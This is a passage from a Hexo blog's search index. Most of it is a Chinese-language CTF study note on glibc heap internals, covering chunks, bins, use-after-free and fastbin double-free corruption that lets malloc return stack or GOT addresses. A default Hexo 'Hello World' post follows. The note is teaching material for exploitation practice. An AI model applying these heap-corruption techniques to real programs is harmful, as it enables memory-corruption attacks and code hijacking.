-16</li><li>chunksize 是 size + 8 后向上对齐至 16 的倍数，因为要存放额外的信息</li></ul></li><li><p>chunk 已回收（not inuse）</p><pre><code class="hljs undefined">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&apos; |             Size of chunk, in bytes                     |A|0|P|  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Forward pointer to next chunk in list             |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Back pointer to previous chunk in list            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Unused space (may be 0 bytes long)                .        .                                                               . next   .                                                               |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&apos; |             Size of chunk, in bytes                           |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|0|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre></li></ul><h3 id="chunk-header">chunk header<a class="post-anchor" href="#chunk-header"></a></h3><ul><li>size：这个 chunk 在内存里的大小，非 malloc size</li><li>fd，bk：指向 bin 里的前一、后一个 chunk<ul><li>一般来说 bin 是 double linked list</li></ul></li><li>prev_size：前一个 chunksize，维护 heap 时可以得知 前一个chunk的位置</li><li>概略来说，每个 chunk 可以看到四个相邻的 chunk<ul><li><code>chunk+size</code> 内存空间的下一个chunk</li><li><code>chunk - prev_size</code> 内存空间里的前一个 chunk</li><li><code>fd,bk</code> double linked list(bin),在内存中不一定是在前或后</li></ul></li></ul><h3 id="size">size<a class="post-anchor" href="#size"></a></h3><ul><li>size 位置 包含 chunk size 和 flag bits</li><li>chunk size 把 size 最低位 3bits 归 0<ul><li>fastbin &lt;= 128</li><li>Small bin &lt; 1024</li><li>Large bin</li><li>Mmap &gt;= 0x20000</li></ul></li><li>最低 bit 为 prev_inuse bit，用来表示 前一个 chunk 是不是在使用中<ul><li>free 会 使得下一个 chunk 的 prev_inuse bit 被设为 0</li></ul></li></ul><h3 id="Heap-操作">Heap 操作<a class="post-anchor" href="#Heap-操作"></a></h3><ul><li>p = malloc(size)<ul><li>找出一个可用的 chunk，或从 top chunk 切一块下来</li><li>如果这个 chunk 是回收的，要先从 bin 里面 unlink，即移出这个 linked list</li><li>填好结构，并回传 chunk + 16</li></ul></li><li>free(p)<ul><li>检查一下该 chunk 内存地址前后的 chunk，是不是 not inuse</li><li>如果有，则这些回收的 chunk 可以被合并成一块</li><li>合并后的新 chunk，放进对应的 bin 中</li></ul></li></ul><h2 id="Exploit-use-after-free">Exploit : use after free<a class="post-anchor" href="#Exploit-use-after-free"></a></h2><ul><li>跟 chunk bin 等 heap 的内部操作没什么关系</li><li>让程序里有两个指针指向同一块内存<ul><li>一块是 structure，另一块是用作 data buffer</li><li>利用对 buffer 的读写，修改或泄漏 structure 的内容</li></ul></li></ul><h3 id="利用-Chunk-的回收特性">利用 Chunk 的回收特性<a class="post-anchor" href="#利用-Chunk-的回收特性"></a></h3><ul><li>所谓 use after free，是指 free(=p) 掉后还继续使用它<ul><li>例：linked list remove 掉chunk后，忘了把指向它的指针置0，导致以为此 chunk 还存在 list 中</li></ul></li><li>重新 malloc(=p) 一样的大小，会拿到曾经 free 掉的 chunk，此时就存在两个指针 p、q 指向同一块 chunk，使用这两个指针的操作会混在一起<ul><li>例：其中一个是 C++ chunk，有个 vtable 指针用来找出实际的 function。如果另一个是可写入的 data buffer，就可以改掉 function pointer</li></ul></li><li>只要实际的 chunk size 相同，malloc 要求的大小不同也没关系。</li><li>会拿出哪个 chunk，取决于 heap 里 bin 的运作方式，不一定是最近 free 的那一个。</li></ul><h2 id="fastbin-corruption">fastbin corruption<a class="post-anchor" href="#fastbin-corruption"></a></h2><p><strong>基础知识</strong></p><ul><li><code>chunk size &lt;= get_max_fast()</code> 的 chunk，会被放在一系列称为 fastbin 的 bin 里<ul><li>64 bit 是 128 bytes，32bit 是 64 bytes</li><li>global_max_fast 一开始是 0</li></ul></li><li>fastbin 是 single linked list，只使用 fd，以 NULL 结尾</li><li>chunk size 从 32 开始，共 7 个可用的 fastbin</li><li>free 时不取消下个 chunk 的 prev_inuse bit，因为 fastbin chunk 不会与其他 chunk 合并</li><li>malloc、free 操作时 glibc 会有一些检查，确认 heap metadata 是否正确，避免一些可能的攻击方式</li><li>为了执行效率，fastbin 里的检查比其他类型的 bin 少很多</li></ul><p><strong>利用方式</strong></p><ul><li>让 fastbin linked list 指向任意地址，之后 malloc 时就会将该地址作为 chunk 拿出来</li><li>freed(not inuse) chunk 才会存在 bin 里，修改它的 fd 才会造成 corruption<ul><li>double free</li><li>overflow</li></ul></li></ul><pre><code class="hljs python">fastbin[0] ---&gt; chunk1   +---&gt; chunk2   +---&gt; chunk3  fd --+         fd --+         fd ---&gt; NULL..........&gt; arbitrary address</code></pre><h3 id="Fastbin-sanity-check">Fastbin sanity check<a class="post-anchor" href="#Fastbin-sanity-check"></a></h3><ul><li>malloc 从 bin 里取出时，要从正确的 bin 里拿出来，即 chunk size 要正确</li><li>free 时，nextchunk 的 size 要对</li><li>free 时会检查 bin 里第一个 chunk 是不是跟现在 free 的 chunk 是同一个（fasttop）</li><li>fasttop 只检查 bin 里第一个 chunk，只要不是连续 free 同一个 chunk 就没关系<ul><li><code>free(p);free(q);free(p)</code></li></ul></li><li>Double free 造成类似 use after free 的效果，可以改掉还在 bin 里的 chunk fd 的值<ul><li>bin 是由 fd 串起来的 linked list，改掉 fd 可以让 linked list 接往任意地址</li><li>多次 malloc 后，就会拿到一个地址可控制的 chunk</li></ul></li><li>取出的 chunk 其 size 要正确，所以并非是完全任意地址，要能构造假的 size<ul><li>用 stack 上的变量当作 size，可以 malloc 出一个 stack 上的地址</li><li>GOT上，用 64 bit 地址常见的 0x40 当作 size</li></ul></li><li>取得 chunk 后，由机会对该地址任意读写</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/10/10/hello-world/"/>
      <url>/2018/10/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start">Quick Start<a class="post-anchor" href="#Quick-Start"></a></h2><h3 id="Create-a-new-post">Create a new post<a class="post-anchor" href="#Create-a-new-post"></a></h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server">Run server<a class="post-anchor" href="#Run-server"></a></h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files">Generate static files<a class="post-anchor" href="#Generate-static-files"></a></h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites<a class="post-anchor" href="#Deploy-to-remote-sites"></a></h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
